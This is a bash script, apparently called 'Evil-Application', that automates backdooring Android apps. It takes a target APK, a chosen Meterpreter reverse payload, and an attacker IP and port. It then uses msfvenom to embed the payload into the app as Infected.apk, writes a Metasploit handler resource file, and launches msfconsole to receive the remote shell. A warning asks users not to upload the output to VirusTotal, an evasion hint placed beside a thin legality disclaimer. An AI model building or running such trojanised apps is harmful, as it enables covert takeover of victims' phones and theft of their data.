#!/bin/bash
# v_2.1
#Color
Red='\033[0;31m'   #Red
g='\033[0;32m'     #Green
p='\033[0;35m'     #Purple
BBlue='\033[1;34m' #Bold Blue
none='\033[0m'     #none/no color
BG='\033[1;32m'    #Bold Green
BR='\033[1;31m'    #Bold Red 
Yel='\033[0;33m'       # Yellow
BYel='\033[1;33m'      # Yellow

#checking if root!
if [ "$EUID" -ne 0 ]
  then 
       printf "                                                       \n"
       printf "${BG}**************************************${none}     \n"
       printf "                                                       \n"
       printf "  ${BR}Opps! Your not running as 'ROOT':(${none}       \n"
       printf "                                                       \n"
       printf "${BG}**************************************${none}     \n"
       printf "                                                       \n"
  exit
fi
trap 'printf "\n";stop;exit 1' 2

stop() {

capktool=$(ps aux | grep -o "apktool" | head -n1)
czipalign=$(ps aux | grep -o "zipalign" | head -n1)
capksigner=$(ps aux | grep -o "apksigner" | head -n1)
cjarsigner=$(ps aux | grep -o "jarsigner" | head -n1)
if [[ $czipalign == *'zipalign'* ]]; then
pkill -f -2 zipalign > /dev/null 2>&1
killall -2 zipalign > /dev/null 2>&1
fi
if [[ $capktool == *'apktool'* ]]; then
pkill -f -2 apktool > /dev/null 2>&1
killall -2 apktool > /dev/null 2>&1
fi
if [[ $capksigner == *'apksigner'* ]]; then
pkill -f -2 apksigner > /dev/null 2>&1
killall -2 apksigner > /dev/null 2>&1
fi
if [[ $cjarsigner == *'jarsigner'* ]]; then
pkill -f -2 jarsigner > /dev/null 2>&1
killall jarsigner > /dev/null 2>&1
fi
clear
banner/evil2.sh
echo
printf "${BG}Thank-You for using Evil-Application!\nBye :)\n"
}


# dependencies
dependencies() {
if [[ -e infected.apk/lastexecute.txt ]]; then
cat infected.apk/lastexecute.txt
sleep 3
fi
clear
./banner/evil.sh
if [[ -e autometasploit.rc ]]; then
printf "${BR}NEED CLEANUP\n"
rm autometasploit.rc
fi
if [[ -e infected.apk/Infected.apk ]]; then
rm infected.apk/Infected.apk
fi
if [[ -e infected.apk/lastexecute.txt ]]; then
rm infected.apk/lastexecute.txt
fi
echo ""
sleep 1
printf "${BG}CLEANED\n"
sleep 1
echo "Checking for the Packages!"
printf "${BR}"
if ! command -v apktool &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt install apktool
fi

if ! command -v apksigner &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt-get install apksigner
fi

if ! command -v zipalign &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt install zipalign
fi

if ! command -v python &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt install python
fi

if ! command -v python-pip &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt install python-pip
fi

if ! command -v cowsay &> /dev/null
then
    echo "Tool is not installed, Trying to install Tools"
    sudo apt install cowsay
    pip install cowsay
fi
if ! command -v jarsigner &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt install openjdk-11-jdk
fi
if ! command -v xterm &> /dev/null
then
    echo "Package is not installed, Trying to install Package!"
    sudo apt install xterm
fi
clear
./banner/evil2.sh
echo ""
sleep 0.5
printf "\n${BG}APKTOOL...OK"
sleep 0.5
printf "\nAPKSIGNER...OK"
sleep 0.5
printf "\nZIPALIGN...OK"
sleep 0.5
printf "\nPYTHON...OK"
sleep 0.5
printf "\nPYTHON-PIP...OK"
sleep 0.5
printf "\nCOWSAY...OK"
sleep 0.5
printf "\nXTERM...OK"
sleep 0.5
printf "\nJARSIGNER...OK${none}"
sleep 1
printf "\n${BR}METASPLOIT-FRAMEWORK!!!${none}\n"
echo ""
sleep 3
clear
}
banner() {
clear
banner/evil.sh
printf ""
}

banner2() {
clear
banner/evil2.sh
embed
}

embed() {
printf "${BR}Please! Do not use this Tool for illegal purposes!\n"
printf "Any illegal purpose of this Tool is your responsibility\n"
printf "Test it on your own devices and network! H4cking is Illegal\n"
printf "Please Do not upload the application on the virus total!\n"
printf "${BG}\n"
sleep 2
read -n 1 -s -r -p "Press any key to continue"
sleep 0.5
printf "${BG}\nOK.\n"
sleep 0.2
clear
banner/evil2.sh
sleep 0.2
printf "${BG}\n"
ls original.apk/
echo ""
read -p "Target Apk: " apk
echo ""
printf "${BG}=================\n"
printf "| Payload Type! |\n"
printf "${BG}=================\n"
echo ""
printf "${BR}1${BG}) 'android/meterpreter/reverse_tcp'\n"
printf "${BR}2${BG}) 'android/meterpreter/reverse_http'\n"
printf "${BR}3${BG}) 'android/meterpreter/reverse_https'\n"
printf "${BR}4${BG}) ${BG}'${BR}Quit${BG}'\n"
echo ""
read -p "Payload type: " payload
echo ""
if [[ $payload == 1 || $payload == 01 ]]; then
load='android/meterpreter/reverse_tcp'
elif [[ $payload == 2 || $payload == 02 ]]; then
load='android/meterpreter/reverse_http'
elif [[ $payload == 3 || $payload == 03 ]]; then
load='android/meterpreter/reverse_https'
elif [[ $payload == 4 || $payload == 04 ]]; then
sleep 1
banner/evil2.sh
printf "${BG}Thank-You for using Evil-Application!\nBye :)\n"
exit 1
else
printf "${BRed}[!] Invalid option!${clear}\n"
fi

read -p "IP Addr: " ip
echo ""
printf "${BG}Port ex: 4444\n"
read -p "Port: " port
echo ""
printf "${BG}Creating Resources File\n"
echo "use exploit/multi/handler" > autometasploit.rc
echo "set payload $load" >> autometasploit.rc
echo "set lhost $ip" >> autometasploit.rc
echo "set lport $port" >> autometasploit.rc
echo "exploit" >> autometasploit.rc

sleep .05
printf "${BG}Resources File created\n"
# process...
sleep 1
clear
banner/evil2.sh
printf "${BG}payload-type=${BR}$load \n"
printf "${BG}Host & Port=${BR}$ip:$port\n"
printf "${BYel}Warning...\n"
printf "${BYel}About to embed $apk with $ip:$port \n"
xterm -T "Infecting $apk" -geometry 95x28+1000+1000 -e "sudo msfvenom -x original.apk/$apk -p $load lhost=$ip lport=$port -o infected.apk/Infected.apk; sleep 10"
if [[ -e infected.apk/Infected.apk ]]; then
cowsay "App Successful"
echo "app-name=$apk" > infected.apk/lastexecute.txt
echo "host=$ip" >> infected.apk/lastexecute.txt
echo "port=$port" >> infected.apk/lastexecute.txt
echo "status=Success" >> infected.apk/lastexecute.txt
else
printf "App Doesn't supported to Embed"
echo "app-name=$apk" > infected.apk/lastexecute.txt
echo "host=$ip" >> infected.apk/lastexecute.txt
echo "port=$port" >> infected.apk/lastexecute.txt
echo "status=Failed" >> infected.apk/lastexecute.txt
fi
sleep 1
clear
banner/evil2.sh
echo ""
printf "${BR}Please! Do not use this Tool for illegal purposes!\n"
printf "Any illegal purpose of this Tool is your responsibility\n"
printf "Test it on your own devices and network! H4cking is Illegal\n"
printf "Please Do not upload the application on the virus total!\n"
echo ""
printf "${BG}"
read -n 1 -s -r -p "Press any key to continue"
sleep 1
exploit
}

exploit(){
clear
banner/evil2.sh
printf "${BG}================\n"
printf "${BG}| What's Next? |\n"
printf "${BG}================\n"
echo ""
printf "${BR}1${BG}) Start Metasploit! \n"
printf "${BR}2${BG}) Re-Run the Script! \n"
printf "${BR}3${BG}) ${BR}Exit${none}\n"
printf "${BG}"
read -p "option: " opt

if [[ $opt == 1 || $opt == 01 ]]; then
printf "${BG}starting ${BR}metasploit ${BYel}w ${BG}autometasploit.rc\n"
msfconsole --resource autometasploit.rc
elif [[ $opt == 2 || $opt == 02 ]]; then
./evil
elif [[ $opt == 3 || $opt == 02 ]]; then
clear
banner/evil2.sh
echo
printf "${BG}Thank-You for using Evil-Application!\nBye :)\n"
exit 1
else
printf "${BRed}[!] Invalid option!${clear}\n"
fi
}

dependencies
banner
banner2
